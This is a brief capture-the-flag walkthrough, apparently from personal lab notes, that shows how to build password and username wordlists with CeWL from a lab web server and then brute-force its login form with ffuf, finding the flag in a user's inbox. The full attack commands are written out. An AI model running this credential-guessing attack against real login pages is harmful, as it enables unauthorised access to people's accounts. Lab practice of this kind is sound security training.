# Steps

1. Start by grabbing a password list using [[Custom Wordlist Generator|CeWL]]
```bash
cewl -d 2 -m 5 http://10.10.118.91/ -w password.list --with-numbers
```

2. Do the same for usernames on the team member page
```bash
cewl -d 0 -m 5 http://10.10.118.91/team.php -w usernames.list --lowercase
```

3. The task calls to use [[wfuzz]] but I decided to use [[ffuf]]
```bash
ffuf -w password.list:W1,usernames.list:W2 -X POST -d "username=W2&password=W1" -u http://10.10.118.91/login.php -t 150 -ac -H "Content-Type: application/x-www-form-urlencoded"
```

4. Flag located under Inbox -> `kevin@northpole.thm`
